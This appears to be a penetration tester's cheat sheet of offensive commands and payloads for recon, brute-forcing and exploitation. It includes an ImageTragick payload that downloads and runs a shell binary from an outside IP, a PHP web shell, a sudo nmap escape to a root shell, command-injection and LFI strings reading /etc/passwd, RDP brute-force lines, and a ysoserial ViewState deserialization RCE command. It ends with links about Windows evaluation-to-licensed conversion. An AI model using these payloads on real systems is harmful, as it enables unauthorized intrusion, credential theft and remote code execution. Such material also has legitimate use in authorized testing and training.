Office365/OWA: 
   python office365userenum.py -u usernames.txt -o valid_useranames.txt   
   https://sensepost.com/blog/2017/outlook-forms-and-shells/
   ./ruler-linux64 --email <email> --password <password> abk dump  -o emails.txt    #extract valid emails
   
Linkedin: 
  python InSpy.py --empspy wordlists/title-list-large.txt --emailformat first.last@corp.com.br "Corp name" --limit 10
  linkedin2username.py (patched)

DNS: 
  https://github.com/aboul3la/Sublist3r
  https://github.com/michenriksen/aquatone
  https://github.com/laramies/theHarvester
  https://dnsdumpster.com/
  
  dnsrecon -d <site> -t brt -D /usr/share/golismero/wordlist/dns/dnsrecon.txt
  dnsrecon -n  10.1.1.225 -r 10.1.1.0-10.1.1.255
  |
   -> -n = NS Server 
   -> -r = range

FirebaseDB:
   python3 firebase.py -l list.txt
   |
    -> https://github.com/w4fz5uck5/firebase
   
fcrackzip:
  fcrackzip -v -D -u -p /usr/share/dict/words secret.zip
  
ImageTragick:
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://127.0.0.0/oops.jpg"|curl <IP>/shell.elf -o /tmp/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf; echo "rce1)'
  pop graphic-context

PHP: 
  bypass password login with arrays:
   |
    -> GET /?password[]=aaaa 
        | reference
          -> http://danuxx.blogspot.com.br/2013/03/unauthorized-access-bypassing-php-strcmp.html
        

Compile exploit in linux:
  gcc-mingw-w64 
  i686-w64-mingw32-gcc
  gcc
  g++
  
NMAP: 
  nmap -sV -sC -A -n -T3 <host>
  nmap -p- -T3 <host>
  nmap -sU -T3 --top-ports 2500 <host>
  nmap -sV -sS -sC -A -n -T3 <host>
  echo "os.execute('/bin/bash')" > /tmp/shell.nse && sudo nmap --script /tmp/shell.nse
  
Command Injection:
  127.0.0.1;/bin/whoami 2>&1    #Redirect STDERR to STDOUT showing the command.
  127.0.0.1;`/bin/whoami`

LFI:
  fimap 
  kadimus 
  LFISuite
  /proc/self/environ
  /proc/self/fd
  php://filter/convert.base64-encode/resource=index
  php://input
  |
   -> POST: <?php system("whoami"); ?>
  Reference:
    |
     -> http://php.net/manual/en/wrappers.php
  ..././..././..././..././etc/passwd -> RECOMENDED
  
PHP WebShell:
  <?php $c = shell_exec($_GET[cmd]); echo "<pre>$c</pre>"; ?>
   weevely
   
   Interesting PHP extensions for fileupload bypassing:
   .phar
   .phpt
   .php3....N
   .phtml
   
   
RDP:
  python crowbar.py -b rdp  -u <USER> -n 50 -C /usr/share/john/password.lst -s 127.0.0.1/32 #bruteforce
  xfreerdp /v:127.0.0.1:3389  /u:"" -sec-nla                                                #enum RDP users
  xfreerdp /v:127.0.0.1:3389 /u:<user> /p:<pass>  -sec-nla /size:90%  
  
  rdesktop -u <USER> -r disk:share=/root/Downloads/ 127.0.0.1                               #mount to use privesc exploits
  rdesktop 127.0.0.1 -g 90%
  
Passwords wordlists to bruteforce:
  Small: 
    /usr/share/john/password.lst
  Medium: 
    10-million-password-list-top-100000.txt
  Big:
    rockyou.txt

.git Files:
  https://github.com/internetwache/GitTools
  
.DS_Store Files:
  https://github.com/lijiejie/ds_store_exp


.NET deserialization:
  https://www.youtube.com/watch?v=eDfGpu3iE4Q 
  https://github.com/NotSoSecure/Blacklist3r
  https://www.notsosecure.com/project-blacklist3r/
  https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/
  https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
  
VIEWSTATE -> EnableViewStateMac=false and viewStateEncryptionMode=false [MAC NOT ENABLED]
   ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo OOOPS!!! > c:/Vuln_Server.txt" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="05ae4b41-51e1-4c3a-9241-6b87b169d663" --isdebug â€“islegacy

VIEWSTATE -> .Net < 4.5 and EnableViewStateMac=true & ViewStateEncryptionMode=false [MAC ENABLED]
  AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy

VIEWSTATE .Net >= 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true/false except both attribute to false [MAY BE ENCRYPTED]:
  AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"
  
.NET common serialization pattern: 
  cookie=....AAAEAAAD//////....
  cookie=....AAAQAAAP//////....
  
SHAREPOINT / EXCHANGE:
    https://www.youtube.com/watch?v=ObxxXU8GRMI
    https://github.com/pwntester/DupeKeyInjector
        https://sharepoint-server.com/_api/web/siteusers -> DUMP all sharepoint users for attack
    
SQLMAP:

   IIS common and usefull tampers:
       percentage.py, unmagicquotes.py
       
   MySQL + PHP (addslashes($_GET["param"]) (LIKE CLAUSE => ".... LIKE '%$param%'") Bypass
      --string param should be important as example to tell sqlmap that page length (which returned NULL body), are considered "True"
         sqlmap -u "http://site.com/?param=pwned*" --threads 10 --dbms=mysql --batch --tamper=unmagicquotes,space2hash --proxy http://127.0.0.1:8080 --string="Content-Length: 0"
         
FREE DEDICATED KMS SERVER FOR WINDOWS KEYS VALIDATION:
   https://docs.ovh.com/pt/dedicated/windows-key/
   https://msguides.com/microsoft-software-products/windows-server.html
   https://msguides.com/microsoft-software-products/
   
   CONVERT EVALUATION WINDOWS SYSTEM TO STANDARD / DATACENTER:
      https://nolabnoparty.com/en/windows-2016-server-convert-evaluation-licensed-version/
   
#TODO
